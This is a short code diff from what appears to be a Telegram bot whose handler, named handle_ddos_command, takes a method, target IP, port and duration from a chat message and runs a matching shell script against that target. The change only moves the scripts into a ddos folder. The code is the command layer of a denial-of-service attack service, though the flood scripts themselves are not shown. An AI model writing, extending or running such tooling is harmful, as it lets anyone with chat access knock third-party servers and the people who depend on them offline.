@@ -164,7 +164,7 @@ async def handle_ddos_command(update: Update, context: CallbackContext) -> None:
     await update.message.reply_text(success_message)
 
     # 选择脚本名称
-    script_name = f'./{method}.sh'
+    script_name = f'./ddos/{method}.sh'
 
     # 执行脚本
     subprocess.Popen([script_name, ip, str(port), str(time)])
